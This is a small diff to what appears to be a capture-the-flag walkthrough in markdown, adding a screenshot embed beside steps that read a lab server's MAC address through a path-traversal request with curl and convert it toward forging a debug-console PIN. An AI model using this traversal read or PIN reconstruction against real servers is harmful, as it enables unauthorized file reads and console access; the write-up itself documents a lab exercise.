@@ -108,6 +108,8 @@ export TERM=xterm-256color
 curl http://10.10.11.164/uploads/..//sys/class/net/eth0/address --path-as-is --ignore-content-length
 python -c 'print(0x0242ac110007)'
 ```
+>[!example]- Result
+>![[Pasted image 20250226193042.png]]
 
 - now we have all pieces to reproduce a PIN code to get access at debug console, first we need to get MAC address (In my case `2485377892359`)
 ```bash
